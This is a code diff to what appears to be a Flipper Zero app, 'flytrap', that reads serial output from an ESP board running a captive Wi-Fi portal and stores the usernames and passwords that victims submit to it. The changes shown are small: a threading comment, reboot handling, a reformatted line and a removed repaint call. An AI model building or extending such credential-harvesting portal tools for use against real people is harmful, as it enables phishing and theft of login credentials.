@@ -2,6 +2,9 @@
 #include "flytrap_storage.h"
 #include "../flytrap_i.h"
 
+// NOTE: this all runs on the GUI thread (drained from the Live scene's event
+// handler), so app state is mutated by a single thread — no locking needed.
+
 static void flytrap_store_cred(FlytrapApp* app, const char* kv) {
     strncpy(app->captures[app->cap_head].kv, kv, FLYTRAP_CAP_KV_SIZE - 1);
     app->captures[app->cap_head].kv[FLYTRAP_CAP_KV_SIZE - 1] = '\0';
@@ -27,6 +30,10 @@ static void flytrap_process_line(FlytrapApp* app, const char* line) {
             app->portal_running = true;
         } else if(strncmp(tok, "stopped", 7) == 0) {
             app->portal_running = false;
+        } else if(strncmp(tok, "boot", 4) == 0) {
+            // The ESP rebooted (e.g. it was mid-restart). Re-run the handshake
+            // if we still own an active session.
+            if(app->session_active) app->need_restart = true;
         }
     } else if(strncmp(line, "HIT", 3) == 0) {
         app->client_count++;
@@ -37,8 +44,7 @@ static void flytrap_process_line(FlytrapApp* app, const char* line) {
         furi_string_set(app->legacy_user, line + 3);
     } else if(strncmp(line, "p: ", 3) == 0) {
         FuriString* kv = furi_string_alloc();
-        furi_string_printf(
-            kv, "u=%s&p=%s", furi_string_get_cstr(app->legacy_user), line + 3);
+        furi_string_printf(kv, "u=%s&p=%s", furi_string_get_cstr(app->legacy_user), line + 3);
         flytrap_store_cred(app, furi_string_get_cstr(kv));
         furi_string_free(kv);
     }
@@ -63,6 +69,4 @@ void flytrap_parser_feed(uint8_t* buf, size_t len, void* ctx) {
             }
         }
     }
-    // Repaint the live view on the GUI thread.
-    view_dispatcher_send_custom_event(app->view_dispatcher, FlytrapEventRefreshView);
 }
